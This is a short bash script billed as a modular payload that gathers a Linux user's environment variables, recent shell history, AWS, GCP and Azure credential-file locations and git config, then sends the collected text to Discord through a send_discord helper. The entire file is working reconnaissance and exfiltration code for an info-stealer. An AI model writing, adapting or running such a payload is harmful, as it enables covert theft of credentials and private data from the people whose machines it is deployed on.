#!/bin/bash
# ============================================================
# Environment Variables Extractor for Linux - Modular Payload
# ============================================================

SYSID=$(get_sysid)
OUTPUT="🔧 **Environment from $SYSID**\n"
OUTPUT+="📅 $(date '+%Y-%m-%d %H:%M:%S')\n"
OUTPUT+="========================================\n\n"

# Interesting environment variables
OUTPUT+="**📍 Key Variables:**\n"
OUTPUT+="• USER: \`$USER\`\n"
OUTPUT+="• HOME: \`$HOME\`\n"
OUTPUT+="• SHELL: \`$SHELL\`\n"
OUTPUT+="• PATH: \`$PATH\`\n"
OUTPUT+="• PWD: \`$PWD\`\n"
OUTPUT+="• DISPLAY: \`${DISPLAY:-not set}\`\n"
OUTPUT+="• SSH_CLIENT: \`${SSH_CLIENT:-not set}\`\n"
OUTPUT+="• TERM: \`$TERM\`\n\n"

# Shell history
OUTPUT+="**📜 Recent Commands (last 20):**\n"
OUTPUT+="\`\`\`"
if [[ -f "$HOME/.bash_history" ]]; then
    tail -20 "$HOME/.bash_history" 2>/dev/null
elif [[ -f "$HOME/.zsh_history" ]]; then
    tail -20 "$HOME/.zsh_history" 2>/dev/null
fi
OUTPUT+="\`\`\`\n\n"

# AWS credentials check
OUTPUT+="**☁️ Cloud Credentials:**\n"
if [[ -f "$HOME/.aws/credentials" ]]; then
    OUTPUT+="• AWS: ✅ Found ~/.aws/credentials\n"
fi
if [[ -f "$HOME/.config/gcloud/credentials.db" ]]; then
    OUTPUT+="• GCP: ✅ Found gcloud credentials\n"
fi
if [[ -d "$HOME/.azure" ]]; then
    OUTPUT+="• Azure: ✅ Found ~/.azure\n"
fi

# Git config
if [[ -f "$HOME/.gitconfig" ]]; then
    OUTPUT+="\n**📦 Git Config:**\n"
    OUTPUT+="\`\`\`$(cat "$HOME/.gitconfig")\`\`\`\n"
fi

send_discord "$OUTPUT"

